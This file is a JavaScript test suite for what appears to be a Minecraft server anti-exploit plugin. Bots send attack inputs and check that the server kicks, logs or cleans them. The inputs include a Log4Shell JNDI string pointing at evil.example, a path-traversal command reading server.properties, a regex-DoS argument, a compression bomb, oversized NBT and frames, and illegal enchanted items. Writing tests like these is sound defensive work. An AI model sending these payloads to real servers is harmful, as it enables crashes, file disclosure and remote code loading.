const h = require('./h');
const fs = require('fs');
const zlib = require('zlib');
const { sleep, bot, alive, quit, record, ip, ask, size, readFrom, count, cmd, waitEnd, kickText } = h;

const label = process.argv[2] || 'run';
const only = process.argv.slice(3);
const tests = [];
const T = (id, name, fn) => tests.push({ id, name, fn });

const str = v => ({ type: 'string', value: v });
const compound = (v, name = '') => ({ type: 'compound', name, value: v });
const stack = (blockId, nbtData, itemDamage = 0) => ({ blockId, itemCount: 1, itemDamage, nbtData });
const click = (b, item, slot = 36) => b._client.write('window_click', { windowId: 0, slot, mouseButton: 0, action: 1, mode: 0, item });
const varint = n => { const out = []; do { let b = n & 0x7f; n >>>= 7; if (n) b |= 0x80; out.push(b); } while (n); return Buffer.from(out); };
const hostile = (o, name, re) => new RegExp(name + ' sent a hostile frame: ' + re.source).test(readFrom(o));

async function kicked(id, name, user, send, logRe) {
  const b = await bot(user, ip());
  if (!alive(b)) return record(id, name, false, 'join failed: ' + kickText(b));
  const o = size();
  await send(b);
  await waitEnd(b, 5000);
  const logged = !logRe || logRe.test(readFrom(o));
  record(id, name, b.ended && logged, `disconnected=${b.ended} logged=${logged}`);
  quit(b);
}

T('C01', 'join and chat', async () => {
  const o = size();
  const b = await bot('Ahmet', ip());
  if (!alive(b)) return record('C01', 'join and chat', false, 'join failed: ' + kickText(b));
  b.chat('merhaba dunya'); await sleep(1200);
  const ok = /Ahmet: merhaba dunya/.test(readFrom(o));
  quit(b); record('C01', 'join and chat', ok, ok ? 'delivered' : 'chat missing');
});

T('C02', 'a colon in command arguments is not a namespace', async () => {
  const b = await bot('Burak', ip());
  b.chat('/me saat 12:30 bulusalim'); await sleep(1500);
  const ok = b.msgs.some(m => /Burak saat 12:30/.test(m));
  quit(b); record('C02', 'a colon in command arguments is not a namespace', ok, ok ? 'command ran' : 'command blocked');
});

T('C03', 'exploit commands are blocked, also behind a namespace', async () => {
  const b = await bot('Okuyucu', ip());
  for (const c of ['/hd readtext ../../server.properties', '/mv ^(.*.?)*$^', '/worldedit:/calc 1+1']) { b.chat(c); await sleep(31500); }
  const vl = await ask('tcguard vl Okuyucu', /Okuyucu:.* commands ([\d.]+)/);
  const seen = b.msgs.filter(m => /Unknown command/.test(m)).length;
  quit(b);
  record('C03', 'exploit commands are blocked, also behind a namespace', seen === 3 && !b.ended, `refused=${seen}/3 vls=${vl && vl[1]}`);
});

T('C04', 'three exploit commands in a row -> kick', async () => {
  const b = await bot('Canan', ip());
  for (let i = 0; i < 3 && !b.ended; i++) { b.chat('//calc 1+1'); await sleep(1400); }
  await waitEnd(b, 3000);
  record('C04', 'three exploit commands in a row -> kick', b.ended, kickText(b)); quit(b);
});

T('C05', 'Log4Shell in chat -> kick, never logged', async () => {
  const o = size();
  const b = await bot('Emre', ip());
  b.chat('${jndi:ldap://evil.example/a}');
  await waitEnd(b, 4000);
  const leaked = /Emre: \$\{jndi/.test(readFrom(o));
  record('C05', 'Log4Shell in chat -> kick, never logged', b.ended && !leaked, `disconnected=${b.ended} logged=${leaked}`);
  quit(b);
});

T('P01', 'vehicle input of NaN -> kick', () => kicked('P01', 'vehicle input of NaN -> kick', 'Furkan',
  b => b._client.write('steer_vehicle', { sideways: NaN, forward: 0, jump: 0 }), /Furkan sent a hostile frame: vehicle input/));
T('P02', 'sign line with a translate component -> kick', () => kicked('P02', 'sign line with a translate component -> kick', 'Yusuf', b => {
  const line = JSON.stringify({ translate: 'chat.type.text', with: ['a', 'b'] });
  b._client.write('update_sign', { location: { x: 0, y: 4, z: 0 }, text1: line, text2: '""', text3: '""', text4: '""' });
}, /Yusuf sent a hostile frame: sign line with a translate/));
T('P03', 'written book page with a translate component -> kick', () => kicked('P03', 'written book page with a translate component -> kick', 'Merve', b => {
  const page = JSON.stringify({ translate: 'chat.type.text', with: ['a', 'b'] });
  click(b, stack(387, compound({ pages: { type: 'list', value: { type: 'string', value: [page] } } })));
}, /Merve sent a hostile frame: book page with a translate/));
T('P04', 'window click on slot 30000 -> kick', () => kicked('P04', 'window click on slot 30000 -> kick', 'Tolga',
  b => click(b, { blockId: -1 }, 30000), /Tolga sent a hostile frame: window click slot 30000/));

T('P05', 'packet flood -> kick with at most 3 alerts', async () => {
  const b = await bot('Oguzhan', ip());
  const o = size();
  for (let i = 0; i < 1500 && !b.ended; i++) b._client.write('arm_animation', {});
  await waitEnd(b, 5000); await sleep(1000);
  const alerts = count(/Oguzhan failed/, o);
  record('P05', 'packet flood -> kick with at most 3 alerts', b.ended && alerts <= 3, `disconnected=${b.ended} alerts=${alerts}`); quit(b);
});

T('P06', '250 swings at once -> notification, no kick', async () => {
  const b = await bot('Esik', ip());
  const o = size();
  for (let i = 0; i < 250; i++) b._client.write('arm_animation', {});
  await sleep(1500);
  const note = /Esik failed ARM_ANIMATION rate/.test(readFrom(o));
  record('P06', '250 swings at once -> notification, no kick', note && !b.ended, `notified=${note} disconnected=${b.ended}`); quit(b);
});

T('F01', 'mining (a swing every tick) raises nothing', async () => {
  const b = await bot('Kaan', ip());
  if (!alive(b)) return record('F01', 'mining', false, 'join failed');
  const o = size();
  const p = b.entity.position.floored(), location = { x: p.x, y: p.y - 1, z: p.z };
  for (let block = 0; block < 6 && !b.ended; block++) {
    b._client.write('block_dig', { status: 0, location, face: 1 });
    for (let t = 0; t < 16 && !b.ended; t++) { b._client.write('arm_animation', {}); await sleep(50); }
    b._client.write('block_dig', { status: 1, location, face: 1 });
  }
  const flags = count(/Kaan (failed|sent)/, o);
  record('F01', 'mining (a swing every tick) raises nothing', !b.ended && flags === 0, `disconnected=${b.ended} alerts=${flags}`); quit(b);
});

T('F02', '60 packets a second for 3 seconds is fine', async () => {
  const b = await bot('Orta', ip());
  for (let s = 0; s < 3 && !b.ended; s++) { for (let i = 0; i < 60; i++) b._client.write('arm_animation', {}); await sleep(1000); }
  record('F02', '60 packets a second for 3 seconds is fine', !b.ended, `disconnected=${b.ended}`); quit(b);
});

T('F03', 'chat still works on the death screen', async () => {
  const b = await bot('Elif', ip(), { respawn: false });
  if (!alive(b)) return record('F03', 'death screen', false, 'join failed');
  await ask('probe kill Elif', /killed Elif/); await sleep(1500);
  const o = size();
  b._client.write('chat', { message: 'olu ekraninda mesaj' }); await sleep(1500);
  const ok = /Elif: olu ekraninda mesaj/.test(readFrom(o));
  record('F03', 'chat still works on the death screen', ok, ok ? 'delivered' : 'dropped'); quit(b);
});

T('F04', 'clicking a full 50-page book is fine', async () => {
  const b = await bot('Yazar', ip());
  if (!alive(b)) return record('F04', 'full book', false, 'join failed');
  const o = size();
  const pages = { type: 'list', value: { type: 'string', value: Array.from({ length: 50 }, (_, i) => ('sayfa ' + i + ' ').padEnd(255, 'şğü')) } };
  for (let i = 0; i < 5; i++) { click(b, stack(386, compound({ pages }))); await sleep(300); }
  await sleep(1000);
  const flags = count(/Yazar (failed|sent)/, o);
  record('F04', 'clicking a full 50-page book is fine', !b.ended && flags === 0, `disconnected=${b.ended} alerts=${flags}`); quit(b);
});

T('N01', '9 KB chat frame is dropped before decoding', () => kicked('N01', '9 KB chat frame is dropped before decoding', 'Nihat',
  b => b._client.write('chat', { message: 'x'.repeat(9000) }), /Nihat sent a hostile frame: frame of/));

T('N02', '40-level NBT is dropped before decoding', () => kicked('N02', '40-level NBT is dropped before decoding', 'Nermin', b => {
  let v = { leaf: { type: 'byte', value: 1 } };
  for (let i = 0; i < 40; i++) v = { a: { type: 'compound', value: v } };
  click(b, stack(1, compound(v)));
}, /Nermin sent a hostile frame: nbt deeper/));

T('N03', 'NBT list of 20000 entries is dropped before decoding', () => kicked('N03', 'NBT list of 20000 entries is dropped before decoding', 'Liste', b => {
  click(b, stack(1, compound({ l: { type: 'list', value: { type: 'byte', value: new Array(20000).fill(1) } } })));
}, /Liste sent a hostile frame: nbt list/));

T('N04', 'book page of 3000 bytes is dropped before decoding', () => kicked('N04', 'book page of 3000 bytes is dropped before decoding', 'Sayfa', b => {
  click(b, stack(386, compound({ pages: { type: 'list', value: { type: 'string', value: ['y'.repeat(3000)] } } })));
}, /Sayfa sent a hostile frame: nbt string 'pages'/));

T('N05', 'sign line of 2000 bytes is dropped before decoding', () => kicked('N05', 'sign line of 2000 bytes is dropped before decoding', 'Tabela', b => {
  const line = JSON.stringify({ text: 'z'.repeat(2000) });
  b._client.write('update_sign', { location: { x: 0, y: 4, z: 0 }, text1: line, text2: '""', text3: '""', text4: '""' });
}, /Tabela sent a hostile frame: sign line/));

T('N06', 'tab-complete of 5000 bytes is dropped before decoding', () => kicked('N06', 'tab-complete of 5000 bytes is dropped before decoding', 'Tab',
  b => b._client.write('tab_complete', { text: '/' + 'a'.repeat(5000) }), /Tab sent a hostile frame: tab-complete/));

T('N07', 'compressed frame announcing 2 MB is dropped before inflating', async () => {
  const b = await bot('Bomba', ip());
  if (!alive(b)) return record('N07', 'zip bomb', false, 'join failed');
  const o = size();
  const body = Buffer.concat([varint(2000000), zlib.deflateSync(Buffer.alloc(2000000))]);
  b._client.socket.write(Buffer.concat([varint(body.length), body]));
  await waitEnd(b, 5000);
  const pre = hostile(o, 'Bomba', /compressed frame inflating/);
  record('N07', 'compressed frame announcing 2 MB is dropped before inflating', b.ended && pre, `disconnected=${b.ended} logged=${pre} wire=${body.length}B`); quit(b);
});

async function creative(user, item) {
  const b = await bot(user, ip());
  await ask(`probe gm ${user} CREATIVE`, /gm ok/); await sleep(800);
  b._client.write('set_creative_slot', { slot: 36, item });
  await sleep(1500);
  const r = await ask(`probe nbt ${user} 0`, /nbt 0=(.*)/);
  quit(b);
  return r ? r[1] : '';
}

T('I01', 'creative item is rebuilt: 32k enchant and attributes gone', async () => {
  const t = await creative('Yaratici', stack(276, compound({
    ench: { type: 'list', value: { type: 'compound', value: [{ id: { type: 'short', value: 16 }, lvl: { type: 'short', value: 32767 } }] } },
    AttributeModifiers: { type: 'list', value: { type: 'compound', value: [{ AttributeName: str('generic.attackDamage'), Name: str('x'), Amount: { type: 'double', value: 1000 }, Operation: { type: 'int', value: 0 }, UUIDLeast: { type: 'long', value: [0, 1] }, UUIDMost: { type: 'long', value: [0, 1] } }] } },
    display: { type: 'compound', value: { Name: str('Kilic') } }
  })));
  const ok = /DIAMOND_SWORD/.test(t) && /lvl:5s/.test(t) && !/AttributeModifiers/.test(t) && /Kilic/.test(t);
  record('I01', 'creative item is rebuilt: 32k enchant and attributes gone', ok, t.slice(0, 140));
});

T('I02', 'blacklisted creative item (command block) is refused', async () => {
  const t = await creative('Komutcu', stack(137));
  record('I02', 'blacklisted creative item (command block) is refused', /EMPTY/.test(t), t || 'no answer');
});

T('I03', 'skull texture does not survive the rebuild', async () => {
  const texture = Buffer.from(JSON.stringify({ textures: { SKIN: { url: 'http://evil.example/' + 'A'.repeat(300) } } })).toString('base64');
  const t = await creative('Kafaci', stack(397, compound({ SkullOwner: { type: 'compound', value: { Name: str('Notch'), Id: str('069a79f4-44e9-4726-a5be-fca90e38aaf5'),
    Properties: { type: 'compound', value: { textures: { type: 'list', value: { type: 'compound', value: [{ Value: str(texture) }] } } } } } } }), 3));
  record('I03', 'skull texture does not survive the rebuild', /SKULL_ITEM/.test(t) && !/Properties|evil/.test(t), t.slice(0, 140));
});

T('I04', 'chest with packed contents arrives empty in creative', async () => {
  const Items = { type: 'list', value: { type: 'compound', value: [{ Slot: { type: 'byte', value: 0 }, id: str('minecraft:bedrock'), Count: { type: 'byte', value: 64 }, Damage: { type: 'short', value: 0 } }] } };
  const t = await creative('Sandikci', stack(54, compound({ BlockEntityTag: { type: 'compound', value: { Items } } })));
  record('I04', 'chest with packed contents arrives empty in creative', /CHEST/.test(t) && !/bedrock|BlockEntityTag/.test(t), t.slice(0, 140));
});

T('I05', 'survival: Sharpness 50 is reset on click, no exception', async () => {
  const b = await bot('Gizem', ip());
  await ask('probe give Gizem 1 STICK DAMAGE_ALL 50', /gave/);
  const o = size();
  click(b, { blockId: -1 }, 37); await sleep(600);
  click(b, { blockId: -1 }, 37); await sleep(900);
  const err = /Could not pass event/.test(readFrom(o));
  const it = await ask('probe item Gizem 1', /item 1=(.*)/);
  quit(b);
  record('I05', 'survival: Sharpness 50 is reset on click, no exception', !err && it && /DAMAGE_ALL=5\b/.test(it[1]), `exception=${err} item=${it && it[1]}`);
});

T('W01', 'a dispenser pouring water onto an end portal is cancelled; an arrow is not', async () => {
  const b = await bot('Dokucu', ip());
  const p = b.entity.position.floored();
  const water = await ask('probe dispense Dokucu 70 1 WATER_BUCKET ENDER_PORTAL', /dispense y=70 cancelled=(\w+)/, 8000);
  await sleep(400);
  await ask(`probe tp Dokucu ${p.x + 12} 70 ${p.z}`, /tp/);
  await sleep(400);
  const arrow = await ask('probe dispense Dokucu 70 1 ARROW ENDER_PORTAL', /dispense y=70 cancelled=(\w+)/, 8000);
  quit(b);
  record('W01', 'a dispenser pouring water onto an end portal is cancelled; an arrow is not', water && water[1] === 'true' && arrow && arrow[1] === 'false', `water=${water && water[1]} arrow=${arrow && arrow[1]}`);
});

T('W02', 'a bucket cannot wash away an end portal', async () => {
  const b = await bot('Kovaci', ip());
  if (!alive(b)) return record('W02', 'bucket on portal', false, 'join failed');
  await ask('probe block Kovaci 2 0 0 ENDER_PORTAL', /block=/);
  await ask('probe gm Kovaci CREATIVE', /gm ok/);
  await ask('probe give Kovaci 0 WATER_BUCKET', /gave/);
  await sleep(400);
  b._client.write('block_place', { location: { x: -1, y: 255, z: -1 }, direction: -1, heldItem: { blockId: 326, itemCount: 1, itemDamage: 0 }, cursorX: 0, cursorY: 0, cursorZ: 0 });
  await sleep(900);
  const block = await ask('probe block Kovaci 2 0 0', /block=(\w+)/);
  quit(b);
  const survived = block && /ENDER_PORTAL/.test(block[1]);
  record('W02', 'a bucket cannot wash away an end portal', survived, `portalStillThere=${survived} (${block && block[1]})`);
});

T('W03', 'mushroom/tree growth over an end portal is cancelled, ordinary growth is not', async () => {
  const b = await bot('Mantarci', ip());
  const overPortal = await ask('probe grow Mantarci RED_MUSHROOM 1', /grow cancelled=(\w+)/, 8000);
  const clear = await ask('probe grow Mantarci RED_MUSHROOM 0', /grow cancelled=(\w+)/, 8000);
  const tree = await ask('probe grow Mantarci TREE 1', /grow cancelled=(\w+)/, 8000);
  quit(b);
  const ok = overPortal && overPortal[1] === 'true' && clear && clear[1] === 'false' && tree && tree[1] === 'true';
  record('W03', 'mushroom/tree growth over an end portal is cancelled, ordinary growth is not', ok, `mushroomOverPortal=${overPortal && overPortal[1]} clearGrowth=${clear && clear[1]} treeOverPortal=${tree && tree[1]}`);
});

T('O01', 'op outside op-guard.allowed is removed, a listed one stays', async () => {
  const a = await bot('Sahip', ip()), b = await bot('Hacker', ip());
  cmd('op Sahip'); cmd('op Hacker');
  await waitEnd(b, 4000);
  const owner = await ask('probe isop Sahip', /isop Sahip=(\w+)/), intruder = await ask('probe isop Hacker', /isop Hacker=(\w+)/);
  quit(a); quit(b);
  record('O01', 'op outside op-guard.allowed is removed, a listed one stays', owner && owner[1] === 'true' && intruder && intruder[1] === 'false' && b.ended,
    `Sahip=${owner && owner[1]} Hacker=${intruder && intruder[1]} kicked=${b.ended}`);
});

T('A01', 'alerts reach tcguard.alerts holders only', async () => {
  const staff = await bot('Yetkili', ip()), other = await bot('Izleyici', ip());
  await ask('probe perm Yetkili tcguard.alerts', /perm/);
  const x = await bot('Sizdir', ip());
  click(x, { blockId: -1 }, 30000); await sleep(1500);
  const got = staff.msgs.some(m => /Sizdir/.test(m)), leaked = other.msgs.some(m => /Sizdir sent/.test(m));
  [staff, other, x].forEach(quit);
  record('A01', 'alerts reach tcguard.alerts holders only', got && !leaked, `staff=${got} other=${leaked}`);
});

T('S01', 'status and reload commands', async () => {
  const s = await ask('tcguard status', /TCGuard [\d.]+: \d+ guarded connections, \d+ blocked/);
  const r = await ask('tcguard reload', /Configuration reloaded/);
  record('S01', 'status and reload commands', s && r, s ? s[0] : 'no answer');
});

const NAMES = ['Abdullah', 'Begum', 'Cansu', 'Davut', 'Erkan', 'Feride', 'Gokhan', 'Hilal', 'Ismail', 'Julide', 'Kadir', 'Lale',
  'Metin', 'Nesrin', 'Osman', 'Pelin', 'Recep', 'Sevgi', 'Tarik', 'Umut'];

T('X01', '20 players online: TPS stays above 19.5, nobody is kicked', async () => {
  const bots = [];
  for (const n of NAMES) { bots.push(await bot(n, ip())); await sleep(300); }
  await sleep(20000);
  const online = bots.filter(alive).length;
  const t = await ask('probe tps', /tps=([\d.]+)/);
  bots.forEach(quit);
  record('X01', '20 players online: TPS stays above 19.5, nobody is kicked', t && +t[1] >= 19.5 && online === 20, `online=${online}/20 tps=${t && t[1]}`);
});

(async () => {
  for (const t of tests) {
    if (only.length && !only.includes(t.id)) continue;
    try { await t.fn(); } catch (e) { record(t.id, t.name, false, 'harness error: ' + e.message); }
    await sleep(1000);
  }
  fs.writeFileSync(`${__dirname}/results-${label}.json`, JSON.stringify(h.results, null, 1));
  console.log(`${label}: ${h.results.filter(r => r.pass).length}/${h.results.length}`);
  process.exit(0);
})();
